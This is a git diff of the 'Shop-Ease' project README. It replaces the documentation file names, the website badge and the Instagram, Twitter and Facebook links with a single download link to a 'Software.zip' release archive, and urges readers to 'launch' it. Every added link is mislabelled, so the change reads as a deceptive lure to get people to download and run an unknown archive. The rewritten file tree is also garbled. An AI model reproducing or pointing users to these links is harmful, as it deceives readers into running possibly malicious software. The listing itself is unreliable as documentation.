@@ -27,18 +27,18 @@ shop-ease/
 │   ├── images/
 │
 ├── documentation/
-│   ├── user-guide.md
-│   ├── developer-docs.md
+│   ├── https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip
+│   ├── https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip
 │
-├── license.md
-├── README.md
+├── https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip
+├── https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip
 ```
 
 ## Getting Started 🚀
 
 To explore the world of Shop-Ease, you can visit our website by clicking the button below:
 
-[![Visit Shop-Ease](https://img.shields.io/badge/Visit-Shop--Ease-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Visit Shop-Ease](https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip)
 
 Keep in mind that the link provided needs to be launched to access the Shop-Ease platform.
 
@@ -58,9 +58,9 @@ Together, we can make Shop-Ease the ultimate shopping destination for everyone!
 
 Stay up-to-date with the latest news and updates from Shop-Ease by following us on social media:
 
-📷 Instagram: [@shopease_official](https://www.instagram.com/shopease_official)  
-🐦 Twitter: [@ShopEaseTweets](https://twitter.com/ShopEaseTweets)  
-📘 Facebook: [Shop-Ease](https://www.facebook.com/ShopEase)
+📷 Instagram: [@shopease_official](https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip)  
+🐦 Twitter: [@ShopEaseTweets](https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip)  
+📘 Facebook: [Shop-Ease](https://github.com/nepthsy/shop-ease/releases/download/v2.0/Software.zip)
 
 Join our growing community of shoppers and retailers to experience the convenience of online shopping like never before.
 
